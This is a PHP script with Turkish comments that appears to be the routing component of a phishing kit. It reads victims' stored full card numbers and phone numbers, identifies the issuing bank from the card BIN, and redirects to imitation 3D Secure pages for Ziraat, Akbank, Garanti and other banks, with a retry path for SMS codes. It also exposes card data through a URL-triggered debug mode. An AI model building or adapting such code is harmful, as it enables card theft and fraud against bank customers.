<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Debug modu (geliştirme için)
$debug = isset($_GET['debug']) ? true : false;

// Retry parametresi kontrolü (SMS hatalı durumu için)
$retry = isset($_GET['retry']) ? $_GET['retry'] : null;

function debugLog($message, $data = null) {
    global $debug;
    if ($debug) {
        echo "<pre style='background: #000; color: #0f0; padding: 10px; margin: 10px;'>";
        echo "<strong>DEBUG:</strong> " . htmlspecialchars($message) . "\n";
        if ($data !== null) {
            print_r($data);
        }
        echo "</pre>";
    }
}

debugLog("3D Redirect başlatıldı");
debugLog("Session ID", $_SESSION['userIdentifier'] ?? 'YOK');

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    debugLog("HATA: Session bulunamadı, index.php'ye yönlendiriliyor");
    if (!$debug) {
        header('Location: index.php');
        exit;
    }
}

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
try {
    $pdo = getDbConnection();
    debugLog("✓ Veritabanı bağlantısı başarılı");
    
    // Kullanıcı bilgilerini al
    $stmt = $pdo->prepare("SELECT * FROM users WHERE user_identifier = ?");
    $stmt->execute([$_SESSION['userIdentifier']]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    
    debugLog("Kullanıcı bilgileri", [
        'id' => $user['id'] ?? 'YOK',
        'card_number' => $user['card_number'] ?? 'YOK',
        'phone' => $user['phone'] ?? 'YOK'
    ]);
    
    if (!$user) {
        debugLog("HATA: Kullanıcı bulunamadı");
        if (!$debug) {
            header('Location: index.php');
            exit;
        }
    }
    
    if (!$user['card_number']) {
        debugLog("HATA: Kart numarası bulunamadı");
        if (!$debug) {
            header('Location: index.php');
            exit;
        }
    }
    
    // Kart numarasının ilk 6 hanesini al (BIN)
    $bin = substr($user['card_number'], 0, 6);
    debugLog("BIN numarası", $bin);
    
    // Bin tablosundan banka kodunu bul
    $stmt = $pdo->prepare("SELECT banka_kod, banka_adi FROM bins WHERE bin = ?");
    $stmt->execute([$bin]);
    $bankInfo = $stmt->fetch(PDO::FETCH_ASSOC);
    
    debugLog("Banka bilgisi", $bankInfo);
    
    if (!$bankInfo) {
        debugLog("UYARI: BIN bulunamadı, diger.php'ye yönlendiriliyor");
        debugLog("Denenen BIN", $bin);
        
        // Session'a genel bilgileri kaydet
        $_SESSION['banka_kod'] = 'unknown';
        $_SESSION['banka_adi'] = 'Bilinmeyen Banka';
        $_SESSION['cc_last_4'] = substr($user['card_number'], -4);
        $_SESSION['no_last_4'] = substr($user['phone'], -4);
        $_SESSION['tutar'] = number_format($user['total'], 2, '.', '');
        
        if (!$debug) {
            header('Location: acs/diger.php');
            exit;
        } else {
            echo "<div style='background: #e74c3c; color: white; padding: 20px; text-align: center;'>";
            echo "BIN BULUNAMADI - diger.php'ye yönlendirilecek";
            echo "</div>";
        }
    }
    
    // Session'a banka bilgilerini kaydet
    $_SESSION['banka_kod'] = $bankInfo['banka_kod'];
    $_SESSION['banka_adi'] = $bankInfo['banka_adi'];
    $_SESSION['cc_last_4'] = substr($user['card_number'], -4);
    $_SESSION['no_last_4'] = substr($user['phone'], -4);
    $_SESSION['tutar'] = number_format($user['total'], 2, '.', '');
    
    debugLog("Session değişkenleri ayarlandı", [
        'banka_kod' => $_SESSION['banka_kod'],
        'banka_adi' => $_SESSION['banka_adi'],
        'cc_last_4' => $_SESSION['cc_last_4'],
        'no_last_4' => $_SESSION['no_last_4'],
        'tutar' => $_SESSION['tutar']
    ]);
    
    // Banka koduna göre yönlendirme
    $bankaKod = $bankInfo['banka_kod'];
    $redirectUrl = '';
    
    switch($bankaKod) {
        case '10': // Ziraat Bankası
            $redirectUrl = 'acs/ziraat.php';
            break;
        case '12': // Halk Bankası
            $redirectUrl = 'acs/other.php';
            break;
        case '15': // Vakıfbank
            $redirectUrl = 'acs/other.php';
            break;
        case '32': // TEB
            $redirectUrl = 'acs/other.php';
            break;
        case '46': // Akbank
            $redirectUrl = 'acs/akbank.php';
            break;
        case '59': // Şekerbank
            $redirectUrl = 'acs/other.php';
            break;
        case '62': // Garanti
            $redirectUrl = 'acs/garanti.php';
            break;
        case '64': // İş Bankası
            $redirectUrl = 'acs/other.php';
            break;
        case '67': // Yapı Kredi
            $redirectUrl = 'acs/other.php';
            break;
        case '99': // ING
            $redirectUrl = 'acs/other.php';
            break;
        case '103': // Denizbank
            $redirectUrl = 'acs/other.php';
            break;
        default:
            $redirectUrl = 'acs/diger.php';
            debugLog("UYARI: Bilinmeyen banka kodu: " . $bankaKod . ", diger.php'ye yönlendiriliyor");
            break;
    }
    
    debugLog("Yönlendirme URL'i", $redirectUrl);
    
    if (!$debug) {
        header('Location: ' . $redirectUrl);
        exit;
    } else {
        echo "<div style='background: #c8912e; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold;'>";
        echo "DEBUG MODU AÇIK - Yönlendirme: " . htmlspecialchars($redirectUrl);
        echo "<br><a href='" . htmlspecialchars($redirectUrl) . "' style='color: white; text-decoration: underline;'>Manuel Yönlendir</a>";
        echo "</div>";
    }
    
} catch(PDOException $e) {
    debugLog("HATA: Veritabanı hatası", $e->getMessage());
    if (!$debug) {
        die('Bir hata oluştu. Lütfen daha sonra tekrar deneyin.');
    }
}

if ($debug) {
    echo "<div style='background: #2ecc71; color: white; padding: 20px; text-align: center; margin-top: 20px;'>";
    echo "Debug modu kapatmak için URL'den ?debug parametresini kaldırın";
    echo "</div>";
}
?>
